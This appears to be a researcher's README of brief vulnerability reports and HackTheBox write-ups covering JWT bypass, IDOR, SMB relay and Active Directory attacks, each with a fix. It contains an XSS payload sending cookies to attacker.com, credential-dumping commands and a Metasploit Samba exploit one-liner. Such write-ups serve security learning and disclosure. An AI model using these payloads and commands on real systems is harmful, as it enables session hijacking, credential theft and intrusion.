# writeups

> Real-world vulnerability reports and CTF solutions.  
> Documenting what I find — because knowledge should be shared.

---

## Web Application Pentests

### [CVE-style] Auth Bypass via JWT None Algorithm
**Target type:** SaaS platform (private disclosure)  
**Severity:** Critical  
**Summary:** The application accepted JWT tokens signed with the "none" algorithm, allowing complete authentication bypass for any user account.  
**Impact:** Full account takeover, admin access  
**Fix:** Enforce HS256/RS256 strictly, reject unsigned tokens  

---

### Stored XSS in Admin Dashboard
**Target type:** E-commerce platform (bug bounty)  
**Severity:** High  
**Summary:** User-supplied input in the "company name" field was rendered unsanitized in the admin dashboard. Injected payload executed in admin context.  
**Payload used:**
```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```
**Impact:** Admin session hijack, full platform compromise  
**Fix:** HTML encode all user input before rendering  

---

### IDOR — Access Any User Invoice
**Target type:** Billing SaaS  
**Severity:** High  
**Summary:** Invoice endpoint used sequential integer IDs with no ownership check. Incrementing the ID returned other users invoices.  
**Request:**
```
GET /api/invoices/10482 HTTP/1.1
Authorization: Bearer <victim_token>
```
**Fix:** Server-side ownership validation on every resource request  

---

## Network Pentests

### Internal Network — Lateral Movement via SMB Relay
**Environment:** Corporate Windows AD (authorized pentest)  
**Summary:** Captured NTLMv2 hashes via Responder, relayed to SMB on a target without signing enforced. Gained initial foothold, escalated to domain admin in 4 hours.  
**Tools:** Responder, ntlmrelayx, BloodHound, mimikatz  
**Fix:** Enforce SMB signing, disable LLMNR/NBT-NS  

---

## CTF Solutions

### HackTheBox — Forest (Active Directory)
**Difficulty:** Medium  
**Path:** AS-REP Roasting → Password crack → DCSync → Domain Admin  
```bash
# AS-REP Roasting
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
# Crack hash
hashcat -m 18200 hash.txt rockyou.txt
# DCSync
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```

---

### HackTheBox — Lame
**Difficulty:** Easy  
**Path:** Samba 3.0.20 CVE-2007-2447 → Root  
```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 10.10.10.3; set LHOST tun0; run"
```

---

> All findings were reported responsibly through proper disclosure channels.
